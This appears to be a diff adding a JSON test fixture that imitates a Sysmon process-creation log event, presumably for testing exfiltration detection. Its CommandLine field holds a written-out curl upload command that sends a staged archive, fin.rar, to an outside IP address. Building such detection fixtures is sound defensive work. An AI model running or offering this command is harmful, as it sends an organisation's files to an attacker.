@@ -1,0 +1,13 @@
+{
+  "_comment": "Staged archive pushed outbound with a curl upload flag",
+  "EventID": 1,
+  "UtcTime": "2026-08-11 10:00:00.000",
+  "Image": "C:\\Windows\\System32\\curl.exe",
+  "CommandLine": "curl.exe -T C:\\Users\\Public\\Libraries\\fin.rar https://45.61.13.7/drop/fin.rar",
+  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+  "ParentCommandLine": "cmd.exe /c",
+  "CurrentDirectory": "C:\\Users\\Public\\",
+  "User": "CORP\\a.patel",
+  "ProcessId": 9600,
+  "IntegrityLevel": "Medium"
+}
